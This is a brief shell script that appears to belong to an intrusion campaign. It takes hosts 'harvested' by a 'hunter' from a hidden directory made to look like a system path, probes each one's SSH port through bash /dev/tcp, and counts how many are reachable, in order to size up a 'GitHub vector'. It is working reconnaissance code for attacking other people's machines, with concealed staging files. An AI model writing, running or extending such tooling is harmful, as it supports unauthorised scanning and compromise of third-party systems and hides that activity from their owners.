#!/bin/sh
# throwaway: of the hosts the hunter harvested, how many even have SSH listening?
# That number is the hard ceiling on the GitHub vector's success rate.
WORK=/tmp/.sysd/.hunt
out=/tmp/sshscan.txt
: > "$out"
cut -f3 "$WORK/targets.txt" 2>/dev/null | sort -u > /tmp/hosts.txt
n=$(wc -l < /tmp/hosts.txt)
echo "distinct_hosts=$n" >> "$out"

while read -r ip; do
    [ -n "$ip" ] || continue
    (
        if command -v bash >/dev/null 2>&1; then
            timeout 3 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null && echo "OPEN $ip" || echo "SHUT $ip"
        else
            echo "UNKNOWN $ip"
        fi
    ) >> "$out" &
done < /tmp/hosts.txt
wait

echo "ssh_open=$(grep -c '^OPEN' "$out")" >> "$out"
echo "sshd_version_scan_done" >> "$out"
